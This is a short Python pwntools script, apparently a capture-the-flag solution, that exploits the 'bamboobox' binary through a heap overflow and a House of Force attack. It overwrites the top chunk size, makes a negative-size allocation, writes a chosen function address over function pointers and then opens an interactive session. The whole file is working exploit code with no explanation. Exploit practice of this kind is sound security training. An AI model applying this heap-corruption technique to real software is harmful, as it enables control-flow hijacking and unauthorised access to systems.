from pwn import *

# context.log_level = "debug"
p = process("./bamboobox")
elf = ELF("./bamboobox")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def cmd(choice):
	p.recvuntil("choice:")
	p.sendline(str(choice))

def add(size , content):
	cmd(2)
	p.recvuntil("name:")
	p.send(str(size))
	p.recvuntil("item:")
	p.send(content)

def change(index , size , content):
	cmd(3)
	p.recvuntil(":")
	p.send(str(index))
	p.recvuntil(":")
	p.send(str(size))
	p.recvuntil(":")
	p.send(content)


magic = 0x400D49
fake_size = 0x20

add(fake_size , "a")
change(0 , fake_size + 0x10, "a" * fake_size + p64(0) + p64(0xffffffffffffffff))
add(-(fake_size + 0x10 + 0x20 + 0x8) , "a")
add(0x10 , p64(magic) * 2)
cmd(5)

p.interactive()